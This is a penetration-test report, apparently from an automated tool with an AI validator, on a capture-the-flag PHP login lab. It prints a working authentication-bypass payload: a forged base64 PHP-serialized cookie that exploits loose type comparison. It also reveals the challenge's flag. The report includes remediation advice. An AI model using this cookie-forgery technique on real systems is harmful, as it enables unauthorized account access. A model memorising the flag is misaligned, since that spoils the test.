# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — session Authentication bypass via forgeable unsigned `creds` cookie + PHP type juggling (insecure deserialization)](#finding-1)
    - [2. LOW — info-disclosure Apache server version disclosed in HTTP error response bodies (ServerSignature enabled)](#finding-2)
    - [3. INFO — burp Input returned in response (reflected) (2 URLs)](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqxeilt7-qoxz6o` |
| Target | http://target.local:32792/ |
| Started | 2026-06-28T06:21:57.591Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32792`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 critical, 1 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [session] Authentication bypass via forgeable unsigned `creds` cookie + PHP type juggling (insecure deserialization)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32792/

Authentication state is carried entirely in a client-controlled, integrity-free cookie. The login at `/` POSTs username+password to `/index.php`, which serializes the supplied credentials into cookie `creds` = base64(PHP serialize(["username"=>..,"password"=>..])) with NO signature/HMAC. On every subsequent GET the server base64-decodes and PHP-`unserialize()`s this fully attacker-controlled cookie and validates it with PHP loose `==`. Two compounding flaws: (1) the cookie is forgeable (no integrity protection — also an insecure-deserialization / PHP Object Injection surface), and (2) the serialized blob lets an attacker choose VALUE TYPES, so substituting a PHP boolean true for the password makes `true == <secret_string>` evaluate TRUE, bypassing the credential check without any valid credential. A forged cookie `a:2:{s:8:"username";b:1;s:8:"password";b:1;}` reaches the authenticated/success page (HTTP 200, 3248 bytes) never shown to unauthenticated users (bare login form = 3106 bytes; a wrong string credential = 3188 bytes). Both forged payloads produced the identical 3248-byte success page regardless of username, confirming the branch is gated solely by the type-confused comparison. NOTE: the bare /index.php (no cookie) correctly returns a login form (auth IS enforced for anonymous access) — the bypass is via forging/tampering the deserialized creds cookie.

**Reproduction**

```
1. Submit any username/password at `/`; the 302 sets cookie `creds` = base64 of `a:2:{s:8:"username";s:N:"..";s:8:"password";s:N:"..";}` — unsigned PHP serialized data.
2. Negative control (not authenticated): GET /index.php with NO creds cookie → HTTP 200, 3106 bytes, bare login form. [ev-mqxetuhz-i] (A wrong STRING credential cookie likewise fails: username="admin",password="admin" → 3188-byte failed-login template, ev-mqxel161-3.)
3. Forge the cookie with boolean-typed values: GET /index.php with `creds=YToyOntzOjg6InVzZXJuYW1lIjtiOjE7czo4OiJwYXNzd29yZCI7YjoxO30=` (= `a:2:{s:8:"username";b:1;s:8:"password";b:1;}`) → HTTP 200, 3248 bytes, authenticated/success page. Repeatable & stable. [ev-mqxercpm-f, ev-mqxes3gi-g]
4. Type drives it: password-only boolean `a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}` (`creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==`) also returns the 3248-byte success page [ev-mqxerbn8-e].
Fix: do not store credentials/auth state client-side — issue an opaque server-side session id; if serialized state must reach the client, HMAC-sign and reject tampered/invalid values, and never unserialize() untrusted input (prefer json_decode with explicit type validation); compare credentials with strict types (===)/hash_equals against a stored password hash.
```

**Evidence**

- Evidence `ev-mqxetuhz-i` — `artifacts/s-0001/ev-mqxetuhz-i/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32792
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3106
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 06:30:41 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 04</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>

</body>
</html>
```

- Evidence `ev-mqxercpm-f` — `artifacts/s-0001/ev-mqxercpm-f/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32792
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3248
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 06:28:45 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 04</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>

<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}</h3></center></body>
</html>
```

- Evidence `ev-mqxes3gi-g` — `artifacts/s-0001/ev-mqxes3gi-g/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32792
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3248
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 06:29:20 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 04</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>

<center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}</h3></center></body>
</html>
```

<a id="finding-2"></a>

### 2. [LOW] [info-disclosure] Apache server version disclosed in HTTP error response bodies (ServerSignature enabled)

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32792/

Apache 2.4.25 (Debian) is exposed in the `<address>` block of every HTTP error response body because `ServerSignature` is not disabled. Apache 2.4.25 was released in 2016 and is end-of-life with multiple published CVEs; version disclosure allows an attacker to enumerate applicable exploits. The 200 OK response from the application root does not embed the version string in its body, confirming the disclosure is limited to Apache-generated error pages (4xx/5xx). The `Server:` response header could not be confirmed absent from responses (tool view is limited), but the body disclosure is independently confirmed.

**Reproduction**

```
1. Send `GET /server-status HTTP/1.1` (or any path that triggers a 403/404) without any credentials.
2. Observe the response body — the `<address>` tag contains `Apache/2.4.25 (Debian) Server at target.local Port 32792`.
3. Remediation: set `ServerSignature Off` and `ServerTokens Prod` in Apache configuration.
```

**Evidence**

- Evidence `ev-mqxf7sow-11` — `artifacts/s-0003/ev-mqxf7sow-11/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32792
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3106
content-type: text/html; charset=UTF-8
date: Sun, 28 Jun 2026 06:41:32 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 04</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>

</body>
</html>
```

- Evidence `ev-mqxf5im4-y` — `artifacts/s-0003/ev-mqxf5im4-y/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:32792
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 305
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 06:39:46 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /server-status
on this server.<br />
</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32792</address>
</body></html>
```

- Evidence `ev-mqxf6zbt-z` — `artifacts/s-0003/ev-mqxf6zbt-z/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:32792
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 305
content-type: text/html; charset=iso-8859-1
date: Sun, 28 Jun 2026 06:40:54 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /server-status
on this server.<br />
</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32792</address>
</body></html>
```

<a id="finding-3"></a>

### 3. [INFO] [burp] Input returned in response (reflected) (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The value of the URL path filename is copied into the application's response. (confidence: CERTAIN) [+1 more URL(s): http://target.local:32792/index.php] @ http://target.local:32792/server-status

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxfampx-12` — `artifacts/_/ev-mqxfampx-12/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:32792

GET /server-status8ysksfxjvr HTTP/1.1
Host: target.local:32792
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 404 Not Found
Date: Sun, 28 Jun 2026 06:43:27 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 304
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /server-status8ysksfxjvr was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32792</address>
</body></html>
```
